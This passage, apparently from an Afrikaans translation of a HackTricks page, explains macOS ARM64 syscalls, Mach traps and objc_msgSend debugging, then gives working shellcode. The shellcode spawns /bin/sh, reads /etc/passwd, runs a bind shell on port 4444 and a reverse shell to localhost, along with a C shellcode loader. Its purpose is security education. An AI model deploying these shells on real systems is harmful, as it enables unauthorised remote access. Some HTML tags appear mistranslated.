- **`AIF`**: Sekere uitsonderings kan gedeaktiveer word deur die bietjies **`A`**, `I`, `F`. As **`A`** 1 is, beteken dit dat **asynchrone afbreek** geaktiveer sal word. Die **`I`** konfigureer om te reageer op eksterne hardeware **Onderbrekingsversoeke** (IRQ's). en die F is verwant aan **Vinnige Onderbrekingsversoeke** (FIR's).

## macOS

### BSD-sisteemaanroep

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD-sisteemaanroepe sal **x16 > 0** hê.

### Mach-valstrikke

Kyk na in [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) die `mach_trap_table` en in [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) die prototipes. Die maksimum aantal Mach-valstrikke is `MACH_TRAP_TABLE_COUNT` = 128. Mach-valstrikke sal **x16 < 0** hê, dus moet jy die nommers van die vorige lys met 'n **min** noem: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in 'n disassembler nagaan om uit te vind hoe om hierdie (en BSD) sisteemaanroepe te doen:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
Soms is dit makliker om die **gedekompilieerde** kode van **`libsystem_kernel.dylib`** te kontroleer **as** om die **bronkode** te kontroleer omdat die kode van verskeie syscalls (BSD en Mach) gegenereer word deur skripte (kontroleer kommentaar in die bronkode) terwyl jy in die dylib kan vind wat opgeroep word.
{% endhint %}

### machdep-oproepe

XNU ondersteun 'n ander tipe oproepe genaamd masjienafhanklik. Die hoeveelheid van hierdie oproepe hang af van die argitektuur en nie die oproepe of hoeveelhede is gewaarborg om konstant te bly nie.

### komm-pagina

Dit is 'n kernel-eienaar-geheuebladsy wat in die adresruimte van elke gebruikersproses afgebeeld word. Dit is bedoel om die oorgang vanaf gebruikersmodus na kernelruimte vinniger te maak as om syscalls te gebruik vir kernelsdiens wat soveel gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.

Byvoorbeeld, die oproep `gettimeofdate` lees die waarde van `timeval` direk vanaf die komm-pagina.

### objc\_msgSend

Dit is baie algemeen om hierdie funksie te vind wat in Objective-C of Swift-programme gebruik word. Hierdie funksie maak dit moontlik om 'n metode van 'n Objective-C-objek aan te roep.

Parameters ([meer inligting in die dokumentasie](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Wysiger na die instansie
* x1: op -> Kieser van die metode
* x2... -> Res van die argumente van die opgeroepde metode

Dus, as jy 'n breekpunt plaas voor die sprong na hierdie funksie, kan jy maklik vind wat in lldb opgeroep word met (in hierdie voorbeeld roep die objek 'n objek vanaf `NSConcreteTask` aan wat 'n bevel sal hardloop):
```
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
Deur die omgewingsveranderlike `NSObjCMessageLoggingEnabled=1` in te stel, is dit moontlik om te log wanneer hierdie funksie in 'n lêer soos `/tmp/msgSends-pid` aangeroep word.
{% endhint %}

### Shellkodes

Om te kompileer:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die byte te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Vir nuwer macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<besonderhede>

<opsomming>C-kode om die dopkode te toets</opsomming>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Skul

Geneem van [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) en verduidelik.

{% tabs %}
{% tab title="met adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="met stapel" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="met adr vir Linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}
{% endtabs %}

#### Lees met kat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus die tweede argument (x1) is 'n reeks van parameters (wat in die geheue beteken dat dit 'n stapel van die adresse is).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Roep die bevel aan met sh van 'n fork sodat die hoofproses nie afgeskiet word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind skaal

Bind skaal van [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) in **poort 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Terugskulp

Van [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<besonderhede>

<opsomming><sterk>Leer AWS-hacking vanaf nul tot held met</sterk> <a href="https://training.hacktricks.xyz/courses/arte"><sterk>htARTE (HackTricks AWS Red Team Expert)</sterk></a><sterk>!</sterk></opsomming>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</besonderhede>
